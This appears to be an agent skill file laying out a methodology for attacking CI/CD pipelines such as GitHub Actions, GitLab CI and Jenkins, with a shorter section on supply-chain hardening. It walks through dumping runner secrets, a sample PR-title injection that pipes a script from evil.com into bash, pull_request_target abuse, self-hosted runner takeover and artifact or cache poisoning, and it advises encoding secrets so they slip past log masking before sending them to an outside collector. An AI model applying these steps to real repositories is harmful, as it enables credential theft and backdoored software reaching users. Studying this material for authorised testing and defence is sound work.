---
name: cicd-technique
description: "CI/CD supply chain methodology: identifying poisoned pipelines, unsafe GitHub Actions, and extracting build secrets."
---

# cicd-technique

**Goal**: Exploit CI/CD pipelines (GitHub Actions, GitLab CI, Jenkins) to achieve code execution in runners, extract pipeline secrets, or backdoor production artifacts.

## When this technique applies
- Evaluating a repository for supply chain vulnerabilities.
- Gained access to a repository with write permissions to Pull Requests, Issues, or Wiki.
- Compromised a CI/CD runner container.

## The Execution Workflow

### 1. Runner Context Enumeration
If you achieved execution within a pipeline step (e.g., via Poisoned PR):
- **Dump secrets**: Run `env`, search for `AWS_ACCESS_KEY_ID`, `GITHUB_TOKEN`, or `$NPM_TOKEN`.
- **Identity**: For GitHub, investigate `ACTIONS_ID_TOKEN_REQUEST_URL` for OIDC (OpenID Connect) trust to AWS/GCP/Azure.

### 2. Identifying Injection Vectors
Review the pipeline configuration files (`.github/workflows/*.yml`, `.gitlab-ci.yml`, `Jenkinsfile`).
- **Untrusted Input in Scripts**: Look for `run:` blocks that echo/execute issue names, PR titles, or commit messages without sanitization:
  ```yaml
  - run: echo "Checking PR title: ${{ github.event.pull_request.title }}"
  ```
  *(A PR titled `"; curl http://evil.com/shell.sh | bash; "` will execute).*
- **`pull_request_target` Abuse ("pwn request")**: Workflows using `pull_request_target` run with elevated repository permissions and access to secrets. If they explicitly check out the fork's `head` (`ref: ${{ github.event.pull_request.head.sha }}`) and then run `npm install`, `make`, or any build step, attacker code executes with the workflow's full privileges.
- **Self-Hosted Runner Takeover**: Non-ephemeral self-hosted runners on public repos are compromised by submitting a PR that adds a job with `runs-on: self-hosted`. The first-time contributor gate can be bypassed once any prior PR is merged; the runner then executes attacker code, and persistence (cron/systemd/`.bashrc`) is often possible because the runner reuses the same workspace between jobs. Named 2024 cases: PyTorch, TensorFlow, Microsoft DeepSpeed.
- **Artifact Poisoning**: A low-privilege workflow (fork PR) uploads a malicious artifact; a later privileged workflow downloads it and executes/extracts it. Watch for `actions/download-artifact` without `github-token` + `run-id` pinning, and `dawidd6/action-download-artifact` <v6 (searches forks by default — GHSA-5xr6-xhww-33m4). Also `actions/download-artifact` <4.1.3 has arbitrary-file-write on extraction (GHSA-cxww-7g56-2vh6).

### 3. Pipeline Poisoning (Artifacts)
- Identify if the pipeline builds the production Docker image or binaries.
- If you can push code or control dependencies (e.g., typosquatting `package.json`), you can implant backdoors natively into the production deployment cycle.

#### Resolver and cache checks
- **Python/pip**: `--extra-index-url` is not a lower-priority fallback: pip checks all configured locations and selects the best matching version. Audit installs for private names also exposed to public indexes; use a controlled source for those names. [pip install: finding packages](https://pip.pypa.io/en/stable/cli/pip_install/#finding-packages).
- **GitHub Actions cache**: Trace cached paths, `key`/`restore-keys`, and privileged consumers. Fork-PR workflows can restore base-branch caches, while caches they create are merge-ref scoped; low-trust default-branch triggers are read-only by default unless a write-capable `cache-mode` override is set. Check whether privileged workflows execute restored contents. [GitHub cache restrictions and low-trust triggers](https://docs.github.com/en/actions/reference/workflows-and-actions/dependency-caching#cache-access-for-low-trust-workflow-triggers).

### Supply-chain assurance
- Preserve one immutable identity chain: source revision and declared inputs → builder/build provenance → artifact digest → tests and signature → promoted artifact; verify artifact tests, signatures, and promotion reference the same artifact digest, not a rebuilt or substituted file. [SLSA build provenance](https://slsa.dev/spec/v1.2/build-provenance).
- Treat an [SBOM](https://www.cisa.gov/resources-tools/resources/2025-minimum-elements-software-bill-materials-sbom) as a component inventory, not evidence that the artifact has no vulnerabilities; use [VEX](https://www.cisa.gov/resources-tools/resources/minimum-requirements-vulnerability-exploitability-exchange-vex) to record vulnerability applicability for the exact product/version with a justification or impact statement.
- Verify signatures/provenance against policy: artifact digest and builder identity bind claims to bytes and a build identity, but neither alone establishes that the builder or output is trustworthy. [SLSA verification](https://slsa.dev/spec/v1.2/verifying-artifacts).
- Pin GitHub Actions to a full-length commit SHA (and verify it belongs to the intended upstream repository), not a mutable tag; retain dependency lockfiles for the action's build where applicable. [GitHub security hardening](https://docs.github.com/en/actions/reference/security/secure-use#using-third-party-actions).

## Quality Gates
- **Beware of Production Impact**: Do not blindly merge poisoned Pull Requests into main. Injecting a backdoor into a build pipeline will trigger incident response or deploy malware to live customers. Keep proofs restricted to harmless `env | grep` outputs (secrets are log-masked; base64/hex-encode before exfil) sent to an out-of-band (OAST) collector.
- **Avoid Credential Rolling**: Only read CI/CD secrets. Do NOT rotate or regenerate them, as it will break the production pipeline completely.
